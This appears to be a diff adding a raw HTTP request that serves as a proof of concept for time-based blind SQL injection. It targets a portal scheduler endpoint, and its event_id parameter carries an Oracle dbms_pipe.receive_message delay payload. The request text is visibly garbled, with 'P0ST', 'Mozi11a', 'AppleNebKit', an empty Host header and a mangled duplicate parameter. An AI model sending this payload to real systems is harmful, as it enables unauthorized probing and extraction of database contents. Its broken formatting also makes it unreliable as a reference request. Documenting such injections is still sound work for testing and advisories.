@@ -1,0 +1,6 @@
+P0ST /portal/pt/oacoSchedulerEvents/uncancelEvent?pageId=login HTTP/1.1
+Host: 
+User-Agent:  Mozi11a/5.0-(Windows NT.10.0; WOW64) AppleNebKit/537.36 (KHTML, like Gecko)chrome/103.0.5060.66-Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+
+event_id=-1'AND 1=dbms_pipe.receive_message('RDS',5)--+#+&startDate=2025-06-26-12:12:12&event_ts=2025-06-26-12:12:12&event ts=2025-06-26 12:12:12
